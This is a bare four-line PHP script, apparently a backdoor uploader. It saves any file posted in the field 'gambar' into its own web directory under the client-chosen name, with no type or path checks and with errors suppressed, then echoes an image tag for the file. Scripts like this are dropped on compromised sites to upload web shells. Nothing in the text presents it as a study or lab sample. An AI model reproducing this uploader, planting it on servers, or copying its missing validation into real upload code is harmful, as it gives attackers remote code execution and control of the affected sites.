<?php
@copy($_FILES[gambar][tmp_name],"".$_FILES[gambar][name]);
echo '<img src='.$_FILES[gambar][name].'>';
?>